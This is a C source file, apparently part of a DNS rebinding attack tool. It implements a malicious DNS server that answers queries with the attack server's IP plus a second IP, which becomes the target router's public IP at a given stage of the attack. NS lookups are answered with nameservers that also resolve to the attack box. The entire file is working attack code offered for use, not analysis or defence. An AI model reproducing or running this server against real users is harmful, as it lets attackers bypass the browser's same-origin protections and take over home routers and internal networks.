/* Very basic DNS server to set up the DNS multiple A record attack:
 * 	1) Always returns the IP address of the interface specified on the command line as the first IP
 *	2) Returns a second IP which is either the same as the first or is the target router's public IP, depending on the DNS query
 *	3) The value of the second IP address is obtained from the dns SQL table; this table is updated by the attack.c code
 *	4) Also handles NS lookups, reporting two DNS servers for the given domain name (ns1, ns2), both of which resolve to the attack box
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>		
#include <sys/types.h>
#include <arpa/inet.h>		
#include <sys/stat.h>
#include <unistd.h>
#include "common.h"
#include "config.h"
#include "socklib.h"
#include "sql.h"
#include "dns.h"

/* DNS server function */
int serve_dns()
{
	int sock = 0, csock = 0, packet_size = 0;
	struct sockaddr_in clientaddr;
	struct dns_header *header = NULL;
	struct dns_question_section *query_info = NULL;
	char *dns_packet = NULL;
	char *question_domain = NULL;
	char *message = NULL;
	char *fqdn = NULL;
	char *server_ip = NULL;
	char *fqdn_offset = NULL;

	memset((void *) &clientaddr,0,sizeof(struct sockaddr_in));

	fqdn = config_get_fqdn();
	server_ip = config_get_server_ip();

	/* Write the attack server domain and IP address to the database */
	if(!init_dns_config(fqdn,server_ip)){
		glog("Failed to initialize DNS settings",LOG_ERROR_TYPE);
		if(server_ip) free(server_ip);
		if(fqdn) free(fqdn);
		return EXIT_FAILURE;
	}

	/* Create UDP socket */
	if((sock = create_socket(server_ip,DNS_PORT,SOCK_DGRAM)) == SOCK_FAIL){
		glog("Failed to create UDP socket for DNS server",LOG_ERROR_TYPE);
		if(server_ip) free(server_ip);
		return EXIT_FAILURE;
	}
	if(server_ip) free(server_ip);

	/* DNS server receive loop */
	while(1){

		/* Free memory, if allocated */
		if(dns_packet) free(dns_packet);
		dns_packet = NULL;

		/* Read in DNS requests */
		if((dns_packet = receive(sock,SOCK_DGRAM,&packet_size,csock,&clientaddr)) == NULL){
			glog("Failed to receive DNS request from client",LOG_ERROR_TYPE);
			return EXIT_FAILURE;
		}

		/* Process DNS request packets */
		if(packet_size <= (int) (sizeof(struct dns_header) + sizeof(struct dns_question_section))){
			glog("Received invalid DNS packet; packet size too small",LOG_ERROR_TYPE);
			continue;
		}
		
		header = (struct dns_header *) dns_packet;

		/* Only process DNS queries that have one question section */
		if(ntohs(header->num_questions) != MAX_DNS_QUESTIONS){
			glog("DNS packet contained the wrong number of questions",LOG_ERROR_TYPE);
			continue;
		}
		
		/* Extract the domain name in a standard string format */
		question_domain = get_domain_in_question(dns_packet,packet_size);

		/* Make sure we got a valid domain query string */
		if(question_domain != NULL && strlen(question_domain) > 0){

			/* Make sure this query is for the right domain name and that the string length of the 
			 * pointer returned from strstr() is the same length as the string length of the fqdn.
			 */
			fqdn_offset = strstr(question_domain,fqdn);
			if(fqdn_offset == NULL || (fqdn_offset && strlen(fqdn_offset) != strlen(fqdn))){

					message = sqlite3_mprintf("Ignoring DNS request for unknown domain %Q",question_domain);
					glog(message,LOG_ERROR_TYPE);
					sqlite3_free(message);

			} else {

				/* Check to make sure this is a type A or type NS, class IN DNS query */
				query_info = (struct dns_question_section *) ((dns_packet) + sizeof(struct dns_header) + strlen(question_domain) + 1);
				if((query_info->class == htons(DNS_CLASS_IN)) && ((query_info->type == htons(DNS_TYPE_A)) || (query_info->type == htons(DNS_TYPE_NS)))){
	
					/* Send DNS reply packet to client */
					if(!send_dns_reply(question_domain,sock,&clientaddr,query_info->type,dns_packet,packet_size)){
						glog("Failed to send DNS response packet",LOG_ERROR_TYPE);
					}

				} else {

					glog("Received unsupported DNS query type or class. Only type A, NS and class IN queries are supported.",LOG_ERROR_TYPE);
					send_dns_reject(sock,&clientaddr,dns_packet,packet_size);
				}
			}
		}

		if(question_domain) free(question_domain);
	}

	if(fqdn) free(fqdn);
	if(dns_packet) free(dns_packet);
	return EXIT_FAILURE;
}

/* Initialize the DNS table and update it by resolving the domain name as well as the www, ns1 and ns2 hosts to the IP address of the specified interface */
int init_dns_config(char *domain, char *ip)
{
	int result_size = 0, err_code = 0, ret_val = 1;
	char *sql_delete = sqlite3_mprintf("DELETE FROM %s",DNS_TABLE);
	char *www = sqlite3_mprintf("%s.%s",WWW,domain);
	char *ns_one = sqlite3_mprintf("%s.%s",NAMESERVER_ONE,domain);
	char *ns_two = sqlite3_mprintf("%s.%s",NAMESERVER_TWO,domain);

	/* Remove any existing entries in the table */
	sql_exec(sql_delete,&result_size,&err_code);
	if(err_code != SQLITE_OK){
		ret_val = 0;
	} else {

		if(!update_dns_config(domain,ip)){
			ret_val = 0;
		} else {
			if(!update_dns_config(www,ip)){
				ret_val = 0;
			} else {
				if(!update_dns_config(ns_one,ip)){
					ret_val = 0;
				} else {
					if(!update_dns_config(ns_two,ip)){
						ret_val = 0;
					}
				}
			}
		}
	}

	sqlite3_free(sql_delete);
	sqlite3_free(www);
	sqlite3_free(ns_one);
	sqlite3_free(ns_two);
	return ret_val;
}

/* Write new entries into the DNS name table. Existing duplicate domain names will be replaced. */
int update_dns_config(char *domain, char *ip)
{
	int result_size = 0, err_code = 0;
	char *sql_insert = sqlite3_mprintf("INSERT OR REPLACE INTO %s (domain,ip) VALUES (%Q,%Q)",DNS_TABLE,domain,ip);

	/* Insert the IP addresses */
	sql_exec(sql_insert,&result_size,&err_code);
	sqlite3_free(sql_insert);
	
	/* Check to make sure insert was successful */
	if(err_code != SQLITE_OK){
		sql_log_error();
		return 0;
	}

	return 1;
}

/* Extract the domain name from the DNS query packet */
char *get_domain_in_question(char *dns_packet, int packet_size)
{
	char *domain_name_pointer = NULL;
	char *domain_name = NULL;
	char *tmp_ptr = NULL;
	int dns_header_len = sizeof(struct dns_header);
	int name_part_len = 0;
	int dn_len = 0;

	if(packet_size > dns_header_len){

		domain_name_pointer = (dns_packet + dns_header_len);
		
		do {
			/* Get the length of the next part of the domain name */
			name_part_len = (int) domain_name_pointer[0];

			/* If the length is zero or invalid, then stop processing the domain name */
			if((name_part_len <= 0) || (name_part_len > (packet_size-dns_header_len))){
				break;
			}
			domain_name_pointer++;

			/* Reallocate domain_name pointer to name_part_len plus two bytes;
			 * one byte for the period, and one more for the trailing NULL byte.
			 */
			tmp_ptr = domain_name;
			domain_name = realloc(domain_name,(dn_len+name_part_len+PERIOD_SIZE+1));
			if(domain_name == NULL){
				if(tmp_ptr) free(tmp_ptr);
				perror("Realloc Failure");
				return NULL;
			}
			memset(domain_name+dn_len,0,name_part_len+PERIOD_SIZE+1);

			/* Concatenate this part of the domain name, plus the period */
			strncat(domain_name,domain_name_pointer,name_part_len);
			strncat(domain_name,PERIOD,PERIOD_SIZE);

			/* Keep track of how big domain_name is, and point 
			 * domain_name_pointer to the next part of the domain name.
			 */
			dn_len += name_part_len + PERIOD_SIZE + 1;
			domain_name_pointer += name_part_len;
		} while(name_part_len > 0);
	}

	return domain_name;
}

/* Reject a DNS lookup */
int send_dns_reject(int sock, struct sockaddr_in *clientaddr, char *request_packet, int request_packet_size)
{
	struct dns_header *reject_packet = NULL;
	int bytes_sent = 0;

	if(request_packet_size > (int) sizeof(struct dns_header)){	

		/* Change the number of answers and the flags values of the DNS packet header */
	        reject_packet = (struct dns_header *) request_packet;
	        reject_packet->num_answers = 0;

		/* This error code causes the fewest IPv6 DNS retries; IPv6 DNS requests are the most
		 * common reason for rejecting a DNS request, particularly when the target client is 
		 * running Linux.
		 */
	        reject_packet->flags = htons(DNS_REPLY_REFUSED);

	        /* Send reply */
        	bytes_sent = sendto(sock,reject_packet,request_packet_size,0,(struct sockaddr *) clientaddr, sizeof(struct sockaddr_in));
	        if(bytes_sent != request_packet_size){
	        	glog("Failed to send response DNS packet",LOG_ERROR_TYPE);
	        } else {
	                return 1;
	        }
	}

	return 0;
}

/* Create DNS reply packet and send it to the client */
int send_dns_reply(char *question_domain, int sock, struct sockaddr_in *clientaddr, int dns_type, char *request_packet, int request_packet_size)
{
	char *reply_packet = NULL, *fqdn = NULL;
	struct dns_header *header = NULL;
	struct dns_answer_section answer;
	int reply_packet_size = 0;
	int answer_size = sizeof(struct dns_answer_section);
	int bytes_sent = 0;
	int memcpy_offset = 0;
	in_addr_t ip_address1 = {0};
	in_addr_t ip_address2 = {0};

	/* Zero out the answer section structure */
	memset(&answer,0,sizeof(struct dns_answer_section));

	fqdn = config_get_fqdn();

	/* Check to make sure the packet size is of a valid length */
	if(request_packet_size > ((int) (sizeof(struct dns_header) + sizeof(struct dns_question_section)) + (int) strlen(question_domain))){

		/* Get the reply IP addresses: the first will always be the attack server's IP.
		 * The second will be either the attack server IP or the target IP, depending on 
		 * which stage of the attack we're in.
		 */
		if(!resolve_ip(fqdn,&ip_address1)){
			glog("Failed to resolve base domain name",LOG_ERROR_TYPE);
			if(fqdn) free(fqdn);
			return 0;
		}
		if(fqdn) free(fqdn);

		if(!resolve_ip(question_domain,&ip_address2)){
			glog("Failed to resolve requested domain name",LOG_ERROR_TYPE);
			return 0;
		}

		/* Create the DNS answer section */
		answer.name = htons(DNS_REPLY_NAME);
		answer.type = dns_type;
		answer.class = htons(DNS_CLASS_IN);
		answer.ttl = htons(DNS_REPLY_TTL);

		if(dns_type == htons(DNS_TYPE_A)){

			/* Data is an IPv4 address */
			answer.data_len = htons(IPV4_ADDR_LEN);

			/* DNS response packet consists of the original DNS query plus the answer section,
			 * plus the answer data (an IPv4 address). We have two IP addresses, so there are
			 * two answer sections.
			 */
			reply_packet_size = request_packet_size + ((answer_size + IPV4_ADDR_LEN) * DNS_NUM_ANSWERS);
			if((reply_packet = malloc(reply_packet_size)) != NULL){

				/* Memcpy packet data into the reply packet */
				memcpy(reply_packet,request_packet,request_packet_size);
				memcpy_offset += request_packet_size;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,(void *) &ip_address1,IPV4_ADDR_LEN);
				memcpy_offset += IPV4_ADDR_LEN;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,(void *) &ip_address2,IPV4_ADDR_LEN);

			} else {
				perror("Malloc Failure");
				return 0;
			}

		} else if(dns_type == htons(DNS_TYPE_NS)){

			answer.data_len = htons(NS_NAME_LEN);

			reply_packet_size = request_packet_size + ((answer_size + NS_NAME_LEN) * DNS_NUM_ANSWERS);
			if((reply_packet = malloc(reply_packet_size)) != NULL){

				/* Memcpy packet data into the reply packet */
				memcpy(reply_packet,request_packet,request_packet_size);
				memcpy_offset += request_packet_size;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,NS_NAME_ONE,NS_NAME_LEN);
				memcpy_offset += NS_NAME_LEN;
				memcpy(reply_packet+memcpy_offset,(void *) &answer,answer_size);
				memcpy_offset += answer_size;
				memcpy(reply_packet+memcpy_offset,NS_NAME_TWO,NS_NAME_LEN);

			} else {
				perror("Malloc Failure");
				return 0;
			}
		}

		/* Change the number of answers and the flags values of the DNS packet header */
                header = (struct dns_header *) reply_packet;
                header->num_answers = htons(DNS_NUM_ANSWERS);
                header->flags = htons(DNS_REPLY_FLAGS);
		
		/* Send reply */
		bytes_sent = sendto(sock,reply_packet,reply_packet_size,0,(struct sockaddr *) clientaddr, sizeof(struct sockaddr_in));
		if(reply_packet) free(reply_packet);

		if(bytes_sent != reply_packet_size){
			glog("Failed to send response DNS packet",LOG_ERROR_TYPE);
		} else {
			return 1;
		}
		
	} else {
		glog("Failed to send DNS reply; DNS request packet appears to have an invalid length.",LOG_ERROR_TYPE);
	}

	return 0;
}

/* Resolve a given domain name to the IP address in the database */
int resolve_ip(char *domain, in_addr_t *ip)
{
	int ret = 0;
	int result_size = 0, err_code = 0;
	char *ip_str = NULL;
	char *sql_select = sqlite3_mprintf("SELECT ip FROM %s WHERE domain = %Q",DNS_TABLE,domain);
	
	ip_str = sql_exec(sql_select,&result_size,&err_code);
	sqlite3_free(sql_select);
	if(ip_str != NULL){
		*ip = inet_addr(ip_str);
		ret = 1;
	} else if(err_code != SQLITE_OK){
		sql_log_error();
	}

	if(ip_str) free(ip_str);
	return ret;
}
